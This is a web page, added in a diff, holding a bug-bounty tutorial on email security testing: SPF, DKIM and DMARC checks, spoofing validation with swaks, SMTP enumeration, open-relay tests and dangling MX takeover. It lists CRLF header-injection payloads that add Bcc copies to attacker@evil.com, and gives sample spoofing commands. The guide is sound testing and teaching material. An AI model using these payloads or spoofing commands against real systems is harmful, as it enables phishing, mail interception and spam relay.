@@ -1,0 +1,852 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <!-- ME1: Dark mode — runs before render to prevent FOUC -->
+    <script>
+      (function() {
+        var saved = localStorage.getItem('theme');
+        if (saved) {
+          document.documentElement.setAttribute('data-theme', saved);
+        } else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+          document.documentElement.setAttribute('data-theme', 'dark');
+          localStorage.setItem('theme', 'dark');
+        }
+      })();
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Find SPF, DKIM, and DMARC bypasses plus mail server vulnerabilities. Covers spoofing, relay abuse, header injection, and email infrastructure testing techniques.">
+    <title>Email Security Testing: SPF, DKIM, DMARC Bypasses and Mail Server Vulnerabilities</title>
+    
+    <!-- Canonical URL -->
+    <link rel="canonical" href="https://bughuntertools.com/articles/email-security-testing-bug-bounty-guide-2026/">
+    
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://bughuntertools.com/articles/email-security-testing-bug-bounty-guide-2026/">
+    <meta property="og:title" content="Email Security Testing: SPF, DKIM, DMARC Bypasses and Mail Server Vulnerabilities">
+    <meta property="og:description" content="Find SPF, DKIM, and DMARC bypasses plus mail server vulnerabilities. Covers spoofing, relay abuse, header injection, and email infrastructure testing techniques.">
+    <meta property="og:site_name" content="Bug Hunter Tools">
+    
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:url" content="https://bughuntertools.com/articles/email-security-testing-bug-bounty-guide-2026/">
+    <meta name="twitter:title" content="Email Security Testing: SPF, DKIM, DMARC Bypasses and Mail Server Vulnerabilities">
+    <meta name="twitter:description" content="Find SPF, DKIM, and DMARC bypasses plus mail server vulnerabilities. Covers spoofing, relay abuse, header injection, and email infrastructure testing techniques.">
+    
+    <!-- Google Fonts: Inter (UI) + JetBrains Mono (code) -->
+    <link rel="stylesheet" href="/css/fonts.css">
+
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-PP6M3SZSVR"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-PP6M3SZSVR');
+    </script>
+    
+    <!-- AI Agent Referrer Tracking -->
+    <script>
+      (function() {
+        var ua = navigator.userAgent || '';
+        var ref = document.referrer || '';
+        var aiSource = null;
+        
+        // Detect AI agents by User-Agent
+        if (ua.includes('ChatGPT-User') || ua.includes('ChatGPT')) {
+          aiSource = 'chatgpt';
+        } else if (ua.includes('Claude') || ua.includes('Anthropic')) {
+          aiSource = 'claude';
+        } else if (ua.includes('PerplexityBot') || ua.includes('Perplexity')) {
+          aiSource = 'perplexity';
+        } else if (ua.includes('GPTBot')) {
+          aiSource = 'openai_crawler';
+        } else if (ua.includes('ClaudeBot') || ua.includes('anthropic-ai')) {
+          aiSource = 'anthropic_crawler';
+        } else if (ua.includes('Bard') || ua.includes('Gemini')) {
+          aiSource = 'google_gemini';
+        } else if (ref.includes('chat.openai.com')) {
+          aiSource = 'chatgpt_referrer';
+        } else if (ref.includes('claude.ai')) {
+          aiSource = 'claude_referrer';
+        } else if (ref.includes('perplexity.ai')) {
+          aiSource = 'perplexity_referrer';
+        }
+        
+        // Send custom event if AI agent detected
+        if (aiSource) {
+          gtag('event', 'ai_agent_visit', {
+            'ai_source': aiSource,
+            'page_path': window.location.pathname,
+            'user_agent': ua
+          });
+          
+          // Set custom dimension
+          gtag('set', {'ai_visitor': aiSource});
+          
+          // Log to console for debugging
+          console.log('AI Agent detected:', aiSource);
+        }
+      })();
+    </script>
+    
+    <!-- Affiliate Link Click Tracking -->
+    <script>
+      document.addEventListener('DOMContentLoaded', function() {
+        // Track clicks on Amazon affiliate links (tag=altclaw-20)
+        var links = document.querySelectorAll('a[href*="amazon.com"][href*="altclaw-20"]');
+        links.forEach(function(link) {
+          link.addEventListener('click', function(e) {
+            var href = this.href;
+            var asin = (href.match(/\/dp\/([A-Z0-9]{10})/) || [])[1] || 'unknown';
+            var label = this.textContent.trim().substring(0, 60) || asin;
+            gtag('event', 'affiliate_click', {
+              'event_category': 'affiliate',
+              'event_label': label,
+              'affiliate_product': asin,
+              'affiliate_program': 'amazon',
+              'page_path': window.location.pathname
+            });
+          });
+        });
+      });
+    </script>
+
+    <!-- Google AdSense Verification -->
+    <meta name="google-adsense-account" content="ca-pub-9373816755142401">
+
+    <!-- Google AdSense -->
+    
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9373816755142401" crossorigin="anonymous"></script>
+    
+
+    <!-- Schema.org markup -->
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "WebPage",
+      "name": "Email Security Testing: SPF, DKIM, DMARC Bypasses and Mail Server Vulnerabilities",
+      "description": "Find SPF, DKIM, and DMARC bypasses plus mail server vulnerabilities. Covers spoofing, relay abuse, header injection, and email infrastructure testing techniques.",
+      "url": "https://bughuntertools.com/articles/email-security-testing-bug-bounty-guide-2026/"
+    }
+    </script>
+</head>
+<body>
+    <!-- Sticky Navigation Bar -->
+    <div class="sticky-nav">
+        <div class="container sticky-nav-inner">
+            <a href="/" class="sticky-nav-logo">🔍 Bug Hunter Tools</a>
+            <div class="sticky-nav-links">
+                <a href="/">Home</a>
+                <a href="/articles/">Articles</a>
+                <a href="/categories/">Categories</a>
+                <a href="/demos/">SecurityClaw Demos</a>
+                <a href="/articles/security-testing-tools-2026/">Tools</a>
+                <a href="/about/">About</a>
+                <a href="/privacy.html">Privacy</a>
+            </div>
+            <button class="dark-mode-toggle" aria-label="Toggle dark mode">🌙</button>
+        </div>
+    </div>
+
+    
+    <!-- Breadcrumb Navigation -->
+    <nav class="breadcrumb" aria-label="Breadcrumb">
+        <div class="container">
+            <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+                <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                    <a itemprop="item" href="/">
+                        <span itemprop="name">Home</span>
+                    </a>
+                    <meta itemprop="position" content="1" />
+                </li>
+                <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                    <a itemprop="item" href="/articles/">
+                        <span itemprop="name">Articles</span>
+                    </a>
+                    <meta itemprop="position" content="2" />
+                </li>
+                <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                    <span itemprop="name">Email Security Testing: SPF, DKIM, DMARC Bypasses and Mail Server Vulnerabilities</span>
+                    <meta itemprop="position" content="3" />
+                </li>
+            </ol>
+        </div>
+    </nav>
+    
+
+    
+
+    <main class="container">
+        
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Article",
+  "headline": "Email Security Testing for Bug Bounty in 2026: How to Find SPF, DKIM, DMARC, and Mail Server Vulnerabilities in Real Targets",
+  "description": "Learn how to test email security for bug bounty. Covers SPF bypass, DKIM weaknesses, DMARC misconfigurations, mail server enumeration, header injection, and spoofing attacks with real-world techniques.",
+  "datePublished": "2026-04-14",
+  "dateModified": "2026-04-14",
+  "author": {
+    "@type": "Organization",
+    "name": "BugHunterTools"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "BugHunterTools"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://bughuntertools.com/articles/email-security-testing-bug-bounty-guide-2026/"
+  }
+}
+</script>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    { "@type": "ListItem", "position": 1, "name": "Home", "item": "https://bughuntertools.com/" },
+    { "@type": "ListItem", "position": 2, "name": "Articles", "item": "https://bughuntertools.com/articles/" },
+    { "@type": "ListItem", "position": 3, "name": "Email Security Testing for Bug Bounty in 2026" }
+  ]
+}
+</script>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "FAQPage",
+  "mainEntity": [
+    {
+      "@type": "Question",
+      "name": "What email security vulnerabilities are in scope for bug bounty?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Most bug bounty programs accept SPF/DKIM/DMARC misconfigurations that enable domain spoofing, email header injection leading to phishing or spam relay, mail server information disclosure, subdomain mail server takeover, and SMTP injection. Check the program policy — some explicitly exclude email spoofing while others pay well for it."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "How do I test if a domain is vulnerable to email spoofing?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Check the SPF record with dig txt domain.com, verify DKIM selectors, and inspect the DMARC policy. A domain with p=none in DMARC, a missing SPF record, or an overly permissive SPF (+all or ~all) can be spoofed. Use tools like spoofcheck or mailspoof to automate the analysis, then confirm by sending a test email through an authorized SMTP relay to your own inbox."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "What tools are used for email security testing in bug bounty?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "For DNS record analysis: dig, nslookup, dmarcian, MXToolbox. For spoofing validation: spoofcheck, mailspoof, swaks (Swiss Army Knife for SMTP). For mail server enumeration: smtp-user-enum, Nmap SMTP scripts. For header injection testing: Burp Suite on contact forms and registration flows. For subdomain mail takeover: subjack and can-i-take-over-xyz."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "Is email spoofing still a valid bug bounty finding in 2026?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Yes. Despite being well-understood, many organizations still have misconfigured DMARC policies (p=none with no enforcement timeline), missing SPF records on subdomains, or DKIM keys that have been compromised or never rotated. Programs like HackerOne and Bugcrowd regularly pay for email spoofing findings when the impact is demonstrated — especially when it enables targeted phishing of employees or customers."
+      }
+    }
+  ]
+}
+</script>
+
+<article>
+
+<div class="key-takeaways">
+<h2>Key Takeaways</h2>
+<ul>
+<li>Email spoofing via SPF/DKIM/DMARC misconfigurations remains one of the most common and impactful bug bounty findings in 2026</li>
+<li>A domain with DMARC <code>p=none</code> and no SPF record is fully spoofable — check every target's DNS records during recon</li>
+<li>Email header injection through contact forms and registration flows is often overlooked and can lead to spam relay or phishing</li>
+<li>Subdomain mail server takeover is a high-severity finding when dangling MX records point to deprovisioned services</li>
+<li>Always send test spoofed emails only to your own inbox — never to target employees or third parties</li>
+</ul>
+</div>
+
+<h2>Why Email Security Testing Matters for Bug Bounty</h2>
+
+<p>Email is the primary attack vector for phishing, business email compromise (BEC), and social engineering. When a target's domain can be spoofed, attackers can send emails that appear to come from legitimate addresses — bypassing spam filters and tricking employees, customers, and partners.</p>
+
+<p>In 2026, BEC losses exceed $50 billion annually. Bug bounty programs know this, and many explicitly reward findings that demonstrate email spoofing capability. The barrier to entry is low — you need DNS lookup tools and a basic understanding of SPF, DKIM, and DMARC — but the impact is consistently rated medium to high.</p>
+
+<p>This guide covers the full email security testing methodology: from DNS record enumeration through spoofing validation, header injection, mail server attacks, and subdomain takeover via dangling MX records.</p>
+
+<h2>Email Authentication Fundamentals</h2>
+
+<p>Before testing, you need to understand the three email authentication mechanisms and how they interact.</p>
+
+<h3>SPF (Sender Policy Framework)</h3>
+
+<p>SPF defines which IP addresses and mail servers are authorized to send email on behalf of a domain. It's a DNS TXT record that receiving mail servers check against the sending server's IP.</p>
+
+<pre><code>; Example SPF record
+v=spf1 include:_spf.google.com include:amazonses.com ip4:203.0.113.0/24 -all</code></pre>
+
+<p>The critical part is the qualifier at the end:</p>
+<ul>
+<li><code>-all</code> (hard fail) — reject emails from unauthorized senders</li>
+<li><code>~all</code> (soft fail) — accept but mark as suspicious. Many receivers treat this the same as no SPF</li>
+<li><code>?all</code> (neutral) — no policy. Effectively useless</li>
+<li><code>+all</code> — allow anyone to send as this domain. Fully spoofable</li>
+</ul>
+
+<h3>DKIM (DomainKeys Identified Mail)</h3>
+
+<p>DKIM adds a cryptographic signature to outgoing emails. The sending server signs the message with a private key, and the receiving server verifies it using a public key published in DNS.</p>
+
+<pre><code>; DKIM public key record
+selector1._domainkey.example.com TXT "v=DKIM1; k=rsa; p=MIGfMA0GCSqGSIb3..."</code></pre>
+
+<p>DKIM weaknesses include: short key lengths (512 or 1024 bits), key reuse across domains, missing selectors, and keys that haven't been rotated in years.</p>
+
+<h3>DMARC (Domain-based Message Authentication, Reporting & Conformance)</h3>
+
+<p>DMARC ties SPF and DKIM together and tells receiving servers what to do when authentication fails.</p>
+
+<pre><code>; Example DMARC record
+_dmarc.example.com TXT "v=DMARC1; p=reject; rua=mailto:dmarc@example.com; pct=100"</code></pre>
+
+<p>The policy (<code>p=</code>) is what matters:</p>
+<ul>
+<li><code>p=reject</code> — spoofed emails are rejected. Hardest to bypass</li>
+<li><code>p=quarantine</code> — spoofed emails go to spam. Bypassable in some scenarios</li>
+<li><code>p=none</code> — no enforcement. Domain is spoofable even with SPF and DKIM in place</li>
+</ul>
+
+<h2>Phase 1: DNS Record Enumeration</h2>
+
+<p>Start every email security assessment by pulling all relevant DNS records. This takes 60 seconds and tells you immediately whether the domain is likely spoofable.</p>
+
+<h3>Pull SPF, DKIM, and DMARC Records</h3>
+
+<pre><code># SPF record
+dig +short txt example.com | grep spf
+
+# DMARC record
+dig +short txt _dmarc.example.com
+
+# MX records (mail servers)
+dig +short mx example.com
+
+# Common DKIM selectors
+for sel in default selector1 selector2 google s1 s2 k1 k2 dkim mail; do
+  echo "=== $sel ===" && dig +short txt ${sel}._domainkey.example.com
+done</code></pre>
+
+<h3>What to Look For</h3>
+
+<table>
+<thead><tr><th>Finding</th><th>Severity</th><th>Why It Matters</th></tr></thead>
+<tbody>
+<tr><td>No SPF record</td><td>Medium</td><td>Any server can send as this domain</td></tr>
+<tr><td>SPF with <code>~all</code> or <code>?all</code></td><td>Low-Medium</td><td>Soft fail — many receivers accept anyway</td></tr>
+<tr><td>SPF with <code>+all</code></td><td>High</td><td>Explicitly allows all senders</td></tr>
+<tr><td>SPF with >10 DNS lookups</td><td>Low</td><td>SPF breaks (permerror) — treated as no SPF</td></tr>
+<tr><td>No DMARC record</td><td>Medium</td><td>No policy enforcement even if SPF exists</td></tr>
+<tr><td>DMARC <code>p=none</code></td><td>Medium</td><td>Monitoring only — no spoofing protection</td></tr>
+<tr><td>DMARC <code>pct=</code> less than 100</td><td>Low</td><td>Policy only applies to a percentage of emails</td></tr>
+<tr><td>DKIM key ≤1024 bits</td><td>Low</td><td>Potentially factorable — 2048+ recommended</td></tr>
+<tr><td>No DKIM record found</td><td>Informational</td><td>May use non-standard selectors</td></tr>
+</tbody>
+</table>
+
+<h3>Automated Analysis</h3>
+
+<pre><code># spoofcheck — automated SPF/DMARC analysis
+git clone https://github.com/BishopFox/spoofcheck.git
+cd spoofcheck && pip install -r requirements.txt
+python spoofcheck.py example.com
+
+# mailspoof — checks for spoofability
+pip install mailspoof
+mailspoof -d example.com</code></pre>
+
+<h2>Phase 2: Spoofing Validation</h2>
+
+<p>Once you've identified a misconfiguration, validate it by sending a test email. <strong>Only send to your own email address.</strong></p>
+
+<h3>Using swaks (Swiss Army Knife for SMTP)</h3>
+
+<pre><code># Install swaks
+sudo apt install swaks
+
+# Send a test spoofed email to YOUR OWN inbox
+swaks --to your-own-email@gmail.com \
+      --from ceo@vulnerable-target.com \
+      --server smtp.your-relay.com \
+      --header "Subject: Email Spoofing PoC — Bug Bounty Test" \
+      --body "This is a proof of concept demonstrating that vulnerable-target.com can be spoofed due to DMARC p=none and missing SPF."</code></pre>
+
+<h3>Checking Results</h3>
+
+<p>After receiving the email, check the full headers:</p>
+<ul>
+<li><code>Authentication-Results</code> — shows SPF, DKIM, and DMARC pass/fail</li>
+<li><code>Received-SPF</code> — shows the SPF evaluation result</li>
+<li>Did the email land in inbox or spam?</li>
+<li>Does the From address display as the target domain?</li>
+</ul>
+
+<p>For your bug bounty report, screenshot the received email showing the spoofed From address and include the full authentication headers.</p>
+
+<h2>Phase 3: Email Header Injection</h2>
+
+<p>Email header injection occurs when user input is inserted into email headers without sanitization. This is common in contact forms, registration flows, password reset emails, and newsletter signup forms.</p>
+
+<h3>Where to Test</h3>
+
+<ul>
+<li>Contact forms that send email confirmations</li>
+<li>Registration forms with "welcome" emails</li>
+<li>Password reset flows</li>
+<li>Invite/referral features ("invite a friend")</li>
+<li>Newsletter subscription confirmations</li>
+<li>Any feature that sends email based on user input</li>
+</ul>
+
+<h3>Injection Payloads</h3>
+
+<pre><code># CRLF injection in email fields — add CC/BCC recipients
+victim@example.com%0ACc:attacker@evil.com
+victim@example.com%0ABcc:attacker@evil.com
+victim@example.com\r\nCc:attacker@evil.com
+
+# Inject additional headers
+victim@example.com%0ASubject:Injected%20Subject
+victim@example.com%0AContent-Type:text/html
+
+# Inject into name fields that appear in From/Reply-To
+Attacker Name%0ACc:attacker@evil.com</code></pre>
+
+<h3>Testing With Burp Suite</h3>
+
+<p>Intercept the form submission in Burp and inject CRLF sequences into every field that might end up in an email header. Check the email parameter, name fields, subject fields, and any custom headers the application sets.</p>
+
+<p>If the application sends an email with your injected header, you've confirmed the vulnerability. The impact ranges from spam relay (adding arbitrary recipients) to phishing (modifying the email body or subject).</p>
+
+<h2>Phase 4: Mail Server Enumeration and Testing</h2>
+
+<p>If the target runs its own mail servers (visible in MX records), there are additional attack surfaces.</p>
+
+<h3>SMTP Enumeration</h3>
+
+<pre><code># Enumerate valid email addresses via VRFY/EXPN
+smtp-user-enum -M VRFY -U users.txt -t mail.example.com
+smtp-user-enum -M RCPT -U users.txt -t mail.example.com
+
+# Nmap SMTP scripts
+nmap -p 25,465,587 --script smtp-commands,smtp-enum-users,smtp-open-relay mail.example.com</code></pre>
+
+<h3>Open Relay Testing</h3>
+
+<pre><code># Test for open relay
+swaks --to test@gmail.com --from test@example.com --server mail.example.com
+
+# Nmap open relay check
+nmap -p 25 --script smtp-open-relay mail.example.com</code></pre>
+
+<p>An open relay allows anyone to send email through the target's mail server — this is a high-severity finding because it enables spam campaigns and phishing that originates from the target's infrastructure.</p>
+
+<h3>STARTTLS Stripping</h3>
+
+<p>Check whether the mail server enforces TLS or allows plaintext connections:</p>
+
+<pre><code># Connect without TLS
+openssl s_client -connect mail.example.com:25 -starttls smtp
+
+# Check for STARTTLS support
+swaks --to test@example.com --server mail.example.com --tls-optional-strict</code></pre>
+
+<p>If the server accepts plaintext SMTP on port 25 without requiring STARTTLS, emails can be intercepted in transit.</p>
+
+<h2>Phase 5: Subdomain Mail Server Takeover</h2>
+
+<p>Dangling MX records are a variant of <a href="/articles/subdomain-takeover-bug-bounty-guide-2026/">subdomain takeover</a> specific to email. When a subdomain's MX record points to a service that's been deprovisioned, an attacker can claim that service and receive all email sent to that subdomain.</p>
+
+<h3>Finding Dangling MX Records</h3>
+
+<pre><code># Enumerate subdomains first (see our subdomain enumeration guide)
+# Then check MX records for each subdomain
+cat subdomains.txt | while read sub; do
+  mx=$(dig +short mx "$sub" 2>/dev/null)
+  if [ -n "$mx" ]; then
+    echo "$sub: $mx"
+  fi
+done</code></pre>
+
+<p>Look for MX records pointing to:</p>
+<ul>
+<li>Deprovisioned Google Workspace domains</li>
+<li>Expired Microsoft 365 tenants</li>
+<li>Removed Zoho Mail configurations</li>
+<li>Third-party email services no longer in use</li>
+</ul>
+
+<h3>Impact</h3>
+
+<p>If you can claim the mail service that a subdomain's MX record points to, you can receive all email sent to addresses at that subdomain. This often includes password reset emails, internal notifications, and automated system alerts — making it a path to <a href="/articles/account-takeover-methodology-bug-bounty-guide-2026/">account takeover</a>.</p>
+
+<h2>Phase 6: SPF Bypass Techniques</h2>
+
+<p>Even when SPF is configured, there are bypass scenarios worth testing.</p>
+
+<h3>SPF Record Exceeding DNS Lookup Limit</h3>
+
+<p>SPF allows a maximum of 10 DNS lookups. If the target's SPF record exceeds this (common with large organizations using multiple email services), SPF evaluation returns a permerror — effectively disabling SPF.</p>
+
+<pre><code># Count DNS lookups in SPF record
+# Each include:, a:, mx:, redirect= counts as a lookup
+dig +short txt example.com | grep spf
+# Then recursively resolve each include to count total lookups</code></pre>
+
+<h3>Subdomain SPF Gaps</h3>
+
+<p>Organizations often configure SPF for their apex domain but forget subdomains. Check <code>mail.example.com</code>, <code>support.example.com</code>, <code>dev.example.com</code>, and other subdomains — they may lack SPF records entirely, making them spoofable even when the main domain is protected.</p>
+
+<h3>SPF Include Chain Exploitation</h3>
+
+<p>If the target's SPF record includes a third-party service you can sign up for (e.g., <code>include:sendgrid.net</code>), you may be able to send authenticated email as the target domain by using that service. This is a design issue — the SPF record trusts all users of that shared service.</p>
+
+<h2>Writing the Bug Bounty Report</h2>
+
+<h3>Report Template for Email Spoofing</h3>
+
+<pre><code>## Title
+Email Spoofing via DMARC p=none and SPF Soft Fail on example.com
+
+## Severity
+Medium (CVSS 5.3-6.5 depending on impact)
+
+## Description
+The domain example.com is vulnerable to email spoofing due to:
+- DMARC policy set to p=none (monitoring only, no enforcement)
+- SPF record uses ~all (soft fail) instead of -all (hard fail)
+
+An attacker can send emails that appear to originate from any @example.com
+address. These emails pass SPF soft fail checks and are not rejected by
+DMARC, landing in recipients' inboxes.
+
+## Steps to Reproduce
+1. Query DMARC: dig +short txt _dmarc.example.com
+   Result: "v=DMARC1; p=none; rua=mailto:..."
+2. Query SPF: dig +short txt example.com
+   Result: "v=spf1 include:_spf.google.com ~all"
+3. Send test email using swaks (to own inbox only):
+   swaks --to my-own-email@gmail.com --from ceo@example.com ...
+4. Email arrives in inbox with From: ceo@example.com
+
+## Impact
+An attacker can impersonate any employee of example.com, enabling:
+- Targeted phishing of customers and partners
+- Business email compromise (BEC) attacks
+- Brand reputation damage
+- Social engineering of internal employees
+
+## Remediation
+1. Set DMARC policy to p=reject (or p=quarantine as interim step)
+2. Change SPF qualifier from ~all to -all
+3. Ensure DKIM is configured and signing all outbound email
+4. Monitor DMARC aggregate reports before enforcing</code></pre>
+
+<h2>Common Mistakes to Avoid</h2>
+
+<ul>
+<li><strong>Sending spoofed emails to target employees</strong> — this is out of scope on every program and may be illegal. Only send to your own inbox</li>
+<li><strong>Reporting DMARC p=none without checking if it's intentional</strong> — some organizations are in monitoring phase. Check the rua/ruf tags — active reporting suggests they're working toward enforcement</li>
+<li><strong>Ignoring subdomain scope</strong> — the apex domain may be locked down while subdomains are wide open</li>
+<li><strong>Not demonstrating impact</strong> — a missing SPF record alone is informational. Show that you can actually deliver a spoofed email to an inbox</li>
+<li><strong>Skipping the program policy</strong> — some programs explicitly exclude email spoofing findings. Read the scope before testing</li>
+</ul>
+
+<h2>Tools Reference</h2>
+
+<table>
+<thead><tr><th>Tool</th><th>Purpose</th><th>Install</th></tr></thead>
+<tbody>
+<tr><td>dig / nslookup</td><td>DNS record queries</td><td>Pre-installed on most systems</td></tr>
+<tr><td>swaks</td><td>SMTP testing and spoofing validation</td><td><code>apt install swaks</code></td></tr>
+<tr><td>spoofcheck</td><td>Automated SPF/DMARC spoofability analysis</td><td>GitHub: BishopFox/spoofcheck</td></tr>
+<tr><td>mailspoof</td><td>Domain spoofability checker</td><td><code>pip install mailspoof</code></td></tr>
+<tr><td>smtp-user-enum</td><td>SMTP user enumeration</td><td><code>apt install smtp-user-enum</code></td></tr>
+<tr><td>Nmap</td><td>SMTP script scanning</td><td><code>apt install nmap</code></td></tr>
+<tr><td>MXToolbox</td><td>Online DNS/email diagnostics</td><td>mxtoolbox.com</td></tr>
+<tr><td>Burp Suite</td><td>Header injection testing</td><td>portswigger.net</td></tr>
+</tbody>
+</table>
+
+<h2>Related Articles</h2>
+
+<ul>
+<li><a href="/articles/bug-bounty-recon-workflow-2026/">Bug Bounty Recon Workflow in 2026</a></li>
+<li><a href="/articles/subdomain-enumeration-tools-2026/">Subdomain Enumeration Tools in 2026</a></li>
+<li><a href="/articles/information-disclosure-bug-bounty-guide-2026/">Information Disclosure for Bug Bounty in 2026</a></li>
+<li><a href="/articles/account-takeover-methodology-bug-bounty-guide-2026/">Account Takeover Methodology for Bug Bounty in 2026</a></li>
+<li><a href="/articles/bug-bounty-resource-center-hub-2026/">Bug Bounty Resource Center</a></li>
+</ul>
+
+</article>
+
+
+        
+        
+        <div class="ad-container ad-below-article">
+            <p class="ad-label">Advertisement</p>
+            <ins class="adsbygoogle"
+                 style="display:block"
+                 data-ad-client="ca-pub-9373816755142401"
+                 data-ad-slot="9879569728"
+                 data-ad-format="auto"
+                 data-full-width-responsive="true"></ins>
+            <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+        </div>
+        
+        
+    </main>
+
+    <footer>
+        <div class="container footer-inner">
+            <span class="footer-updated">Last updated: 16 Apr 2026, 08:48 GMT</span>
+            <p>&copy; 2026 Bug Hunter Tools. All rights reserved. | <a href="/privacy.html" style="color: white;">Privacy Policy</a></p>
+        </div>
+    </footer>
+
+    <!-- ME1: Dark mode toggle handler -->
+    <script>
+      (function() {
+        var btn = document.querySelector('.dark-mode-toggle');
+        if (!btn) return;
+        function updateBtn() {
+          var dark = document.documentElement.getAttribute('data-theme') === 'dark';
+          btn.textContent = dark ? '☀️' : '🌙';
+          btn.setAttribute('aria-label', dark ? 'Switch to light mode' : 'Switch to dark mode');
+        }
+        updateBtn();
+        btn.addEventListener('click', function() {
+          var next = (document.documentElement.getAttribute('data-theme') === 'dark') ? 'light' : 'dark';
+          document.documentElement.setAttribute('data-theme', next);
+          localStorage.setItem('theme', next);
+          updateBtn();
+        });
+      })();
+    </script>
+
+    <!-- ME2: Article hero header + reading time badge -->
+    <script>
+      (function() {
+        var path = window.location.pathname;
+        var isArticle = path.startsWith('/articles/') && path !== '/articles/';
+        var isDemo    = path.startsWith('/demos/')    && path !== '/demos/';
+        if (!isArticle && !isDemo) return;
+        var article = document.querySelector('article');
+        if (!article) return;
+        var text  = article.innerText || '';
+        var words = text.trim().split(/\s+/).filter(Boolean).length;
+        var mins  = Math.max(1, Math.round(words / 238));
+        var badge = '<span class="reading-time-badge">&#9201; ' + mins + ' min read</span>';
+        var header = article.querySelector('header');
+        if (!header) return;
+        header.classList.add('article-hero-header');
+        var metaEl = header.querySelector('.meta, .article-meta');
+        if (metaEl) {
+          metaEl.classList.add('article-hero-meta');
+          metaEl.insertAdjacentHTML('beforeend', ' &middot; ' + badge);
+        } else {
+          var h1 = header.querySelector('h1');
+          if (h1) {
+            var div = document.createElement('div');
+            div.className = 'article-hero-meta';
+            div.innerHTML = badge;
+            header.appendChild(div);
+          }
+        }
+      })();
+    </script>
+
+    <!-- BR2: Sidebar Table of Contents — IntersectionObserver highlight -->
+    <script>
+      (function() {
+        var path = window.location.pathname;
+        var isArticle = (path.startsWith('/articles/') && path !== '/articles/') ||
+                        (path.startsWith('/demos/')    && path !== '/demos/');
+        if (!isArticle) return;
+
+        // Build the ToC from headings/sections inside article
+        function buildSidebarToC() {
+          var article = document.querySelector('article');
+          if (!article) return;
+
+          // Collect anchor targets + labels.
+          // Support two patterns:
+          //   (a) <h2 id="..."> / <h3 id="..."> — explicit IDs on headings
+          //   (b) <section id="..."><h2>...</h2> — IDs on parent sections (older articles)
+          var entries = [];
+
+          // Pass (a): headings with own IDs
+          article.querySelectorAll('h2[id], h3[id]').forEach(function(h) {
+            entries.push({ id: h.id, text: h.textContent, level: h.tagName, el: h });
+          });
+
+          // Pass (b): sections with IDs whose h2 has no id yet
+          if (entries.length < 3) {
+            entries = [];
+            article.querySelectorAll('section[id]').forEach(function(sec) {
+              var h = sec.querySelector('h2, h3');
+              if (!h) return;
+              // Ensure heading has the id so IntersectionObserver works
+              if (!h.id) h.id = sec.id;
+              entries.push({ id: h.id, text: h.textContent, level: h.tagName, el: h });
+            });
+          }
+
+          if (entries.length < 3) return; // not worth showing
+
+          // Add has-toc-sidebar class to main
+          var mainEl = document.querySelector('main');
+          if (mainEl) mainEl.classList.add('has-toc-sidebar');
+
+          // Build sidebar element
+          var sidebar = document.createElement('nav');
+          sidebar.className = 'toc-sidebar';
+          sidebar.setAttribute('aria-label', 'Table of contents');
+
+          var header = document.createElement('div');
+          header.className = 'toc-sidebar-header';
+          header.textContent = 'In this article';
+          sidebar.appendChild(header);
+
+          var list = document.createElement('ul');
+          list.className = 'toc-sidebar-list';
+
+          entries.forEach(function(e) {
+            var li = document.createElement('li');
+            li.className = 'toc-sidebar-item' + (e.level === 'H3' ? ' toc-sidebar-item--sub' : '');
+            li.setAttribute('data-heading-id', e.id);
+
+            var a = document.createElement('a');
+            a.href = '#' + e.id;
+            a.textContent = e.text.replace(/^[0-9]+\.\s*/, ''); // strip leading "1. "
+            li.appendChild(a);
+            list.appendChild(li);
+          });
+
+          sidebar.appendChild(list);
+
+          // Append sidebar to main (grid places it to the right)
+          if (mainEl) mainEl.appendChild(sidebar);
+
+          // IntersectionObserver — highlight active heading
+          var items = sidebar.querySelectorAll('.toc-sidebar-item[data-heading-id]');
+          var activeId = null;
+
+          var observer = new IntersectionObserver(function(entries) {
+            entries.forEach(function(entry) {
+              if (entry.isIntersecting) {
+                activeId = entry.target.id;
+              }
+            });
+
+            items.forEach(function(item) {
+              item.classList.toggle(
+                'toc-sidebar-item--active',
+                item.getAttribute('data-heading-id') === activeId
+              );
+            });
+          }, {
+            rootMargin: '-20% 0px -75% 0px',
+            threshold: 0
+          });
+
+          entries.forEach(function(e) { observer.observe(e.el); });
+
+          // Smooth scroll for sidebar links
+          sidebar.addEventListener('click', function(e) {
+            var a = e.target.closest('a');
+            if (!a) return;
+            var id = a.getAttribute('href').replace('#', '');
+            var target = document.getElementById(id);
+            if (target) {
+              e.preventDefault();
+              target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+              history.replaceState(null, '', '#' + id);
+            }
+          });
+        }
+
+        if (document.readyState === 'loading') {
